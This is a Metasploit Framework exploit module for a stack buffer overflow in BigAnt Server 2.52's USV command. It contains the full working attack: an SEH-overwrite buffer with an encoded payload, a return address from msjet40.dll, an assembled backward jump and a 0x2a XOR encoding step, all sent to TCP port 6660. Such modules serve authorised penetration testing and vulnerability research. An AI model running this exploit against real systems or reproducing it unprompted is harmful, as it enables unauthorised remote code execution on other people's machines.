##
# $Id: bigant_server_usv.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BigAnt Server 2.52 USV Buffer Overflow',
			'Description'    => %q{
				This exploits a stack buffer overflow in the BigAnt Messaging Service,
				part of the BigAnt Server product suite. This module was tested
				successfully against version 2.52.

				NOTE: The AntServer service does not restart, you only get one shot.
			},
			'Author' 	 =>
				[
					'Lincoln',
					'DouBle_Zer0',
					'jduck'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'OSVDB', '61386' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/10765' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/10973' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => (218+709+35),
					'BadChars' => "\x2a\x20\x27\x0a\x0f",
					# pre-xor with 0x2a:
					#'BadChars' => "\x00\x0a\x0d\x20\x25",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'BigAnt 2.52 Universal', { 'Ret' => 0x1b019fd6 } ], # Tested OK (jduck) p/p/r msjet40.dll xpsp3
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Dec 29 2009'))

			register_options([Opt::RPORT(6660)], self.class)
	end

	def exploit
		connect

		sploit = ""
		sploit << payload.encoded
		sploit << generate_seh_record(target.ret)
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + payload_space.to_s).encode_string
		sploit << rand_text_alphanumeric(3)
		sploit << [0xdeadbeef].pack('V') * 3

		# the buffer gets xor'd with 0x2a !
		sploit = sploit.unpack("C*").map{|c| c ^ 0x2a}.pack("C*")

		print_status("Trying target #{target.name}...")
		sock.put("USV " + sploit + "\r\n\r\n")

		handler
		disconnect
	end

end

